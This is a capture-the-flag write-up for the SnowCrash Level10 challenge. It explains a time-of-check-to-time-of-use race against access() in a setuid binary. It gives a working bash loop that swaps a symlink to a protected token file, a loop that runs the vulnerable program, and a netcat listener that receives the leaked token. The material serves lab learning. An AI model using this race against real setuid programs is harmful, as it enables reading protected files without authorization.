# Level10

If we look at the disassembler we can see that there is a moment where `access()` is being used.

```
08048750        if (access(argv[1], 4) != 0)
08048949            var_105c_8 = eax_5
0804894d            var_1060_10 = "You don't have access to %s\n"
08048950            result = printf("You don't have access to %s\n", var_105c_8)
```

I am aware of the `access()` exploit that I once used before in another CTF.
`access()` can be exploited with a race condition. `access()` just checks once and afterwards assumes it is the same file with the same access.
BUT what if you quickly switch from a file you are allowed to read to a file you are not AFTER the `access()` did their chaeck.0

We need three terminals for this exploit.

The first one will run this script:

```
#!/bin/bash

while true; do
    echo 'Hello, world!' > /tmp/file
    rm /tmp/file
    ln -s /home/user/level10/token /tmp/file
    rm /tmp/file
done
```

The second terminal window runs this script:

```
level10@SnowCrash:~$ ifconfig eth0 | grep inet
          inet addr:192.168.122.228  Bcast:192.168.122.255  Mask:255.255.255.0

while true; do ./level10 /tmp/file 192.168.122.228; done
```

And the last one will be netcat that waits for a package to arrive:

```
nc -lk 6969
```

`-lk` means to check for a specific port until told to stop.

We know we need to check 6969 because of the disassembler
